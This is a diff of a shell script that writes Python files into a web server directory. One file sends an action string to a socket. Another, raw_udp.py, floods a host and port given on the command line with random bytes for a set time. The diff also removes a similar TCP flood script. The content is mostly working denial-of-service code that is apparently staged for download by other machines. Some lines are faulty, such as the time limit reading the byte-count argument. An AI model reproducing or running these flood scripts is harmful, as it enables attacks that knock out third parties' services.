@@ -76,7 +76,7 @@ echo "sock.connect((HOST, PORT))" >> /var/www/html/feed.py
 echo "sock.send(ACTION)" >> /var/www/html/feed.py
 echo "sock.close()" >> /var/www/html/feed.py
 
-echo "import sys, socket, random" > /var/www/html/raw_udp.py
+echo "import sys, socket, random, time" > /var/www/html/raw_udp.py
 echo "DHOST = sys.argv[1]" >> /var/www/html/raw_udp.py
 echo "DPORT = int(sys.argv[2])" >> /var/www/html/raw_udp.py
 echo "BYTES = int(sys.argv[3])" >> /var/www/html/raw_udp.py
@@ -87,15 +87,3 @@ echo "while (time.clock() - now) < TIME_AMT:" >> /var/www/html/raw_udp.py
 echo "    try:" >> /var/www/html/raw_udp.py
 echo "        sock.sendto(bytes,(DHOST, DPORT))" >> /var/www/html/raw_udp.py
 echo "    except: pass" >> /var/www/html/raw_udp.py
-
-echo "import sys, socket, random" > /var/www/html/raw_tcp.py
-echo "DHOST = sys.argv[1]" >> /var/www/html/raw_tcp.py
-echo "DPORT = int(sys.argv[2])" >> /var/www/html/raw_tcp.py
-echo "BYTES = int(sys.argv[3])" >> /var/www/html/raw_tcp.py
-echo "TIME_AMT = int(sys.argv[3])" >> /var/www/html/raw_tcp.py
-echo "bytes=random._urandom(BYTES)" >> /var/www/html/raw_tcp.py
-echo "sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM); now = time.clock()" >> /var/www/html/raw_tcp.py
-echo "while (time.clock() - now) < TIME_AMT:" >> /var/www/html/raw_tcp.py
-echo "    try:" >> /var/www/html/raw_tcp.py
-echo "        sock.sendto(bytes,(DHOST, DPORT))" >> /var/www/html/raw_tcp.py
-echo "    except: pass" >> /var/www/html/raw_tcp.py
